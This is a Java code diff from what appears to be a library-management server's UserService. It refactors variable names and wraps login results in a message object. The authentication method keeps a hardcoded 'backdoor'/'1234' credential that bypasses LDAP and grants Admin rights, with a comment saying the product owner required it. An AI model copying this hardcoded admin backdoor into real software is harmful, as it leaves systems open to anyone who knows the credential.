@@ -1,9 +1,11 @@
 package at.fhv.teamg.librarymanagement.server.domain;
 
+import at.fhv.teamg.librarymanagement.server.domain.common.Utils;
 import at.fhv.teamg.librarymanagement.server.ldap.LdapConnector;
 import at.fhv.teamg.librarymanagement.server.persistance.dao.UserDao;
 import at.fhv.teamg.librarymanagement.server.persistance.entity.User;
 import at.fhv.teamg.librarymanagement.shared.dto.LoginDto;
+import at.fhv.teamg.librarymanagement.shared.dto.MessageDto;
 import at.fhv.teamg.librarymanagement.shared.dto.UserDto;
 import at.fhv.teamg.librarymanagement.shared.enums.UserRoleName;
 import java.util.LinkedHashSet;
@@ -24,7 +26,7 @@ public class UserService {
      * @return List of all Users
      */
     public List<UserDto> getAllUsers() {
-        List<UserDto> userDtos = new LinkedList<>();
+        List<UserDto> userDtoList = new LinkedList<>();
 
         getAll().forEach(user -> {
             UserDto.UserDtoBuilder builder = new UserDto.UserDtoBuilder(user.getId());
@@ -36,11 +38,11 @@ public class UserService {
                 .roleId(user.getRole().getId())
                 .username(user.getUsername());
 
-            Set<UUID> lendings = new LinkedHashSet<>();
+            Set<UUID> lendingSet = new LinkedHashSet<>();
             user.getLendings().forEach(lending -> {
-                lendings.add(lending.getId());
+                lendingSet.add(lending.getId());
             });
-            builder.lendings(lendings);
+            builder.lendings(lendingSet);
 
             Set<UUID> reservations = new LinkedHashSet<>();
             user.getReservations().forEach(reservation -> {
@@ -48,32 +50,35 @@ public class UserService {
             });
             builder.reservations(reservations);
 
-            userDtos.add(builder.build());
+            userDtoList.add(builder.build());
         });
 
-        return userDtos;
+        return userDtoList;
     }
 
     /**
-     * Authenticate User against LDAP.
+     * Authenticates User against LDAP.
      *
      * @param loginUser user to login.
      * @return LoginDto with isValid set to true if login was Successfully.
      */
-    public LoginDto authenticateUser(LoginDto loginUser) {
-        boolean isValid = false;
-
+    public MessageDto<LoginDto> authenticateUser(LoginDto loginUser) {
         LOG.info("Try to Login user with Username: {}", loginUser.getUsername());
 
+        // Special backdoor user required by porudct owner
         if (loginUser.getUsername().equals("backdoor") && loginUser.getPassword().equals("1234")) {
-            return new LoginDto.LoginDtoBuilder()
-                .withUsername("Backdoor")
-                .withUserRoleName(UserRoleName.Admin)
-                .withIsValid(true)
-                .build();
+            return Utils.createMessageResponse(
+                "User logged in successfully",
+                MessageDto.MessageType.SUCCESS,
+                new LoginDto.LoginDtoBuilder()
+                    .withUsername("Backdoor")
+                    .withUserRoleName(UserRoleName.Admin)
+                    .withIsValid(true)
+                    .build()
+            );
         }
 
-        isValid = LdapConnector.authenticateJndi(
+        boolean isValid = LdapConnector.authenticateJndi(
             loginUser.getUsername(),
             loginUser.getPassword()
         );
@@ -83,16 +88,23 @@ public class UserService {
             .withIsValid(isValid)
             .build();
 
-        if (!isValid) {
-            LOG.info("Failed login of User: {}", loginUser.getUsername());
-            return loggedInUser;
-        } else {
+        if (isValid) {
             Optional<LoginDto> validLoginUser = findUserByUsername(loggedInUser.getUsername());
             if (validLoginUser.isPresent()) {
-                return validLoginUser.get();
+                return Utils.createMessageResponse(
+                    "Login successful",
+                    MessageDto.MessageType.SUCCESS,
+                    validLoginUser.get()
+                );
             }
-            return loggedInUser;
         }
+
+        LOG.info("Failed login of User: {}", loginUser.getUsername());
+        return Utils.createMessageResponse(
+            "Login failed",
+            MessageDto.MessageType.FAILURE,
+            loggedInUser
+        );
     }
 
     /**
@@ -107,7 +119,7 @@ public class UserService {
         if (foundUser.isPresent()) {
             User user = foundUser.get();
             LoginDto foundLoginDto = new LoginDto.LoginDtoBuilder()
-                .withid(user.getId())
+                .withId(user.getId())
                 .withUsername(user.getUsername())
                 .withUserRoleName(user.getRole().getName())
                 .withIsExternalLibrary(user.isExternalLibrary())
